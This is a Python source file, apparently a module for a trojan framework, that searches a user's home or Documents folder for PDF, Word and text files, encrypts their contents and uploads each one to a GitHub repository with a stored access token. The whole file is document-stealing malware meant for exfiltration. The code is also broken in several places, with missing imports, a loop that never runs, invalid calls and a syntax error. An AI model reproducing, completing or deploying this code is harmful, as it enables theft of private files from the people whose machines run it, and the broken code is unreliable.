#looks for word documents, pdfs and text files with a depth first search
#look into symlinks
#change to push each file (wont need file separator)

import os
import sys
import getpass #needs to be in modules directory

def push_data(config, data): #need to sub in random identifiers
	gh = login(token = config.g_token())
	repo = gh.repository(config.g_usr(), config.g_repo())
	repo.create_file(config.g_data(), config.g_com(), encrypt(config, data)
	return

def encrypt(config, data):
	key = config.pk
	size = config.size
	offset = 0
	encrypted = ""
	compressed = zlib.compress(data)
	while offset < len(compressed):
		chunk = compressed[offset:offset+size]
		encrypted += key.encrypt(chunk)
		offset += size
	return base64.b64encode(encrypted)

def docmine(config, start):
	cdir = start
	dirlist = [cdir]
	fnd = 0
	while not dirlist:
		cdir = dirlist.pop()
		for item in os.listdir(cdir):
			pth = os.path.join(cdir, item)
			if os.path.isdir(pth):
				dirlist.push(pth)
			else:
				if ".pdf" in item or ".doc" in item or 
								".txt" in item:
					data = pth
					with open(pth) as f:
						data += f.read()
						push_data(config, data)
						fnd += 1
	return "Found " + str(fnd)

def run(config, **args):
	platform = sys.platform
	usr = getpass.getuser()
	if platform == "linux2":
		s = os.join("/home", usr)
		return None, docmine(config, s)
	elif platform == "win32":
		s = os.join("", usr, "Documents") #check start directory
		return None, docmine(config, s)
	else: #add support for other platforms
		return None, platform + " not supported"
